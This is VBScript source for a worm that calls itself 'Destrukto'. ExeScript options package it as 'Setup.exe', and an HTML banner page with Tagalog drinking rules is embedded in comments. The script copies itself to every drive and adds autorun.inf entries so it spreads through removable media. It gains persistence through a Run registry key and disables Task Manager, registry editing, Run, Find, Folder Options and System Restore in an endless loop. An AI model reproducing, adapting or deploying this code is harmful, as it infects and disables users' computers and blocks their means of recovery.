' ----- ExeScript Options Begin -----
' ScriptType: window
' DestDirectory: temp
' Icon: C:\WINDOWS\system32\shell32.dll,162
' OutputFile: G:\BAyrus\Setup.exe
' FileVersion: 1.0.0.1
' ProductVersion: 1.0.0.1
' ----- ExeScript Options End -----
'<HTML><HEAD><TITLE>Destrukto</TITLE></HEAD>
'<BODY bgcolor="#000000" text="#000000">
'<DIV style="position:absolute;left:45px;top:11px;width:900px;height:150px;z-index:0" align="left">
'<MARQUEE direction="left" height="150" scrolldelay="90" scrollamount="15" behavior="alternate" loop="0" style="font-family:Arial;font-size:140px;text-decoration:none;color:#ff0000;background-color:transparent;">Destrukto!!!</MARQUEE></DIV>
'<DIV style="position:absolute;left:227px;top:179px;width:500px;height:221px;z-index:1" align="center">
'<FONT style="font-size:32px" color="#ff0000" face="Arial">10 uToS nG mAnGinGiNoM</FONT><FONT style="font-size:13px" color="#000000" face="Arial"><BR>
'</FONT><FONT style="font-size:15px" color="#ff0000" face="Arial">1. Huwag MAKULIT habang umiinom.<BR>2. Huwag MATAKAW sa pulutan.<BR>3. Huwag PATAGALIN ang BASO at mayroon naghihintay ng TAGAY.<BR>4. Huwag uminom ng uminom kaylangang BUMILI ka rin.<BR>5. Uminom ng DIRETSO sa TIYAN at huwag sa ULO.<BR>6. Huwag biglang MAWAWALA sa inuman, MAGPAALAM kung UUWI NA.<BR>7. Magtira ng PANGLAKAD kahit hinlalaki ng paa.<BR>8. Huwag MATUTULOG habang umiinom.<BR>9. Siguraduhing sa BAHAY ang UWI kung lasing na.<BR>10.Huwag MATAKOT sa Gf/Bf.</FONT><FONT style="font-size:13px" color="#ff0000" face="Arial"><BR></FONT></DIV>
'<DIV style="position:absolute;left:313px;top:413px;width:327px;height:24px;z-index:2" align="center">
'<FONT style="font-size:21px" color="#ff0000" face="Arial">Email: destrukto_ako@yahoo.com</FONT>
'</DIV></BODY></HTML>
on error resume next
dim hardiskk,x, y, tex, qwa, tap, pinakalaman, asa, ezx,content,naku, sex, nm, asaka, asakapa, ran, hardisk
set ran = CreateObject("Wscript.Shell")
set qwa = createobject("Scripting.FileSystemObject")
set tap = qwa.getfile(Wscript.ScriptFullname)
set tex=tap.openastextstream(1,-2)
do while not tex.atendofstream
pinakalaman=pinakalaman&tex.readline
pinakalaman=pinakalaman & vbcrlf
loop
set nm = createobject("Scripting.FileSystemObject")
set ezx = nm.getfile(Wscript.ScriptFullname)
set sex=ezx.openastextstream(1,-2)
do while x<19
content=content&sex.readline
content=content & vbcrlf
x = x + 1
loop
Set wendows = qwa.getspecialfolder(0)
set naku=nm.createtextfile(wendows & "\system32\destrukto.html")
naku.write content
naku.close
set naku=nm.getfile(wendows & "\system32\destrukto.html")
naku.attributes = 39
naku.close
' TANGGALIN RECENT INFECTIONS
for each hardiskk in qwa.drives
set asa=qwa.getfile(hardiskk.path &"\autorun.inf")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(hardiskk.path &"\destrukto.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(hardiskk.path &"\fs6519.dll.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(hardiskk.path &"\explorar.vbs")
asa.attributes = 32
asa.delete
asa.close
next
set asa=qwa.getfile(wendows & "\system32\destrukto.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(wendows & "\system\destrukto.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(wendows & "\registration\destrukto.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(wendows & "\inf\destrukto.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(wendows & "\help\destrukto.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(wendows & "\fs6519.dll.vbs")
asa.attributes = 32
asa.delete
asa.close
set asa=qwa.getfile(wendows & "\system32\explorar.vbs")
asa.attributes = 32
asa.delete
asa.close

asakapa = "[autorun]"&vbcrlf&"shellexecute = explorar.vbs"
ran.run (wendows & "\system32\destrukto.html")
y=1
while y < 923456789
x=1
do while x < 40
for each hardisk in qwa.drives
set asa=qwa.createtextfile(hardisk.path &"\explorar.vbs")
asa.write pinakalaman
asa.close
set asa=qwa.getfile(hardisk.path &"\explorar.vbs")
asa.attributes = 39
asa.close
set asa=qwa.createtextfile(hardisk.path &"\autorun.inf")
asa.write asakapa
asa.close
set asa=qwa.getfile(hardisk.path &"\autorun.inf")
asa.attributes = 39
asa.close
next
set asa=qwa.createtextfile(wendows & "\system32\explorar.vbs")
asa.write pinakalaman
asa.close
set asa=qwa.getfile(wendows & "\system32\explorar.vbs")
asa.attributes = 39
asa.close
set asa=qwa.createtextfile(wendows & "\system32\destrukto.html")
asa.write content
asa.close
set asa=qwa.getfile(wendows & "\system32\destrukto.html")
asa.attributes = 39
asa.close
set asa=qwa.getfile(wendows & "\pchealth\helpctr\binaries\msconfig.exe")
asa.attributes = 39
asa.close
ran.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title","DESTRUKTO!!!!!"
ran.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Explorer",wendows&"\system32\explorar.vbs"
ran.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind",1,"REG_DWORD"
ran.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
ran.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
ran.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD"
ran.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"
ran.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\NoFolderOptions",1,"REG_DWORD"
ran.regwrite "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig",1,"REG_DWORD"
ran.regwrite "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR",1,"REG_DWORD"
ran.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun",0,"REG_DWORD"
x = x + 1
wscript.sleep 15000 ' 15 seconds
loop
ran.run (wendows & "\system32\destrukto.html")
Wend